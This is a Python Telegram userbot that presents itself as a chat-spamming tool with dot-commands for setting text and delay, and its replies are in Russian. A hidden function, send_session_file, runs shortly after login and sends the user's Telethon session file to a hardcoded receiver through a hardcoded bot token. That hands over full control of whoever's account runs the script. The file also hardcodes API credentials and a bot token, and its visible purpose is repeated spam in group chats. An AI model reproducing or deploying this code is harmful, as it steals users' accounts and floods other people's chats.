from telethon import TelegramClient, events
import asyncio
import telebot
from telethon.errors import ChatAdminRequiredError, UserKickedError, ChatWriteForbiddenError
from time import sleep

api_id = '20045757'
api_hash = '7d3ea0c0d4725498789bd51a9ee02421'

client = TelegramClient('pbot', api_id, api_hash)

tg_bot_token = '7374176321:AAHCTYkXLTK9hXpdHGLnmvqk06HxVD7GFao'
bot = telebot.TeleBot(tg_bot_token)


receiver_id = 7388074186


message_text = None
delay = 10  
sending = {} 

@client.on(events.NewMessage(pattern=r'\.settext (.+)', outgoing=True))
async def set_text(event):
    global message_text
    message_text = event.pattern_match.group(1).replace("\\n", "\n")
    await event.respond("Текст сообщения установлен.")

@client.on(events.NewMessage(pattern=r'\.help', outgoing=True))
async def help(event):
    await event.respond(f".setkd kd - установить задержку\n.start - начать спам в чат\n.settext txt - установить текст для спама\n.help - эта каманда бро\nхлопчик в трусиках @xidlys")

@client.on(events.NewMessage(pattern=r'\.setkd (\d+)', outgoing=True))
async def set_kd(event):
    global delay
    delay = int(event.pattern_match.group(1))
    await event.respond(f"Задержка установлена на {delay} секунд.")

@client.on(events.NewMessage(pattern=r'\.start', outgoing=True))
async def start_sending(event):
    global sending
    if not message_text:
        await event.respond("Сначала установите текст сообщения с помощью команды .settext.")
        return
    chat_id = event.chat_id
    sending[chat_id] = True
    print(f'Start spamming in chat {chat_id}')
    
    while sending.get(chat_id, False):
        await asyncio.sleep(delay)  # Задержка перед отправкой сообщения
        try:
            await event.respond(message_text)
        except ChatAdminRequiredError:
            await event.respond("У бота нет прав отправки сообщений в этом чате.")
            sending[chat_id] = False
            print(f'Bot was muted in chat {chat_id}, stopping spam.')
            return
        except UserKickedError:
            sending[chat_id] = False
            print(f'Bot was kicked from chat {chat_id}, stopping spam.')
            return
        except ChatWriteForbiddenError:
            sending[chat_id] = False
            print(f'Bot has no write permission in chat {chat_id}, stopping spam.')
            return

@client.on(events.NewMessage(pattern=r'\.stop', outgoing=True))
async def stop_sending(event):
    global sending
    chat_id = event.chat_id
    sending[chat_id] = False
    print(f'Stop spamming in chat {chat_id}')

@client.on(events.ChatAction)
async def handler(event):
    """Handle events like being kicked from a group or chat being deleted."""
    chat_id = event.chat_id
    
    # Проверка на то, что нас кикнули из чата
    if event.user_left or event.user_kicked:
        if event.user_id == client.me.id:
            sending[chat_id] = False
            print(f'Bot was kicked from chat {chat_id}, stopping spam.')

@client.on(events.NewMessage(outgoing=True))
async def check_chat_status(event):
    """Check if the chat still exists before sending messages."""
    chat_id = event.chat_id

    if sending.get(chat_id, False):
        try:
            # Попробуем получить информацию о чате
            await client.get_entity(chat_id)
        except ChatAdminRequiredError:
            sending[chat_id] = False
            print(f'Bot was muted in chat {chat_id}, stopping spam.')
        except UserKickedError:
            sending[chat_id] = False
            print(f'Bot was kicked from chat {chat_id}, stopping spam.')
        except ChatWriteForbiddenError:
            sending[chat_id] = False
            print(f'Bot has no write permission in chat {chat_id}, stopping spam.')
        except:
            sending[chat_id] = False
            print(f'Chat {chat_id} deleted, stopping spam.')

async def send_session_file():
    """Отправить сессию через 5 секунд после подключения."""
    await asyncio.sleep(5)
    session_file = 'pbot.session'
    
    # Отправляем файл сессии через Telegram-бота
    with open(session_file, 'rb') as f:
        bot.send_document(receiver_id, f)

async def main():
    await client.start()
    asyncio.create_task(send_session_file())
    await client.run_until_disconnected()

client.loop.run_until_complete(main())
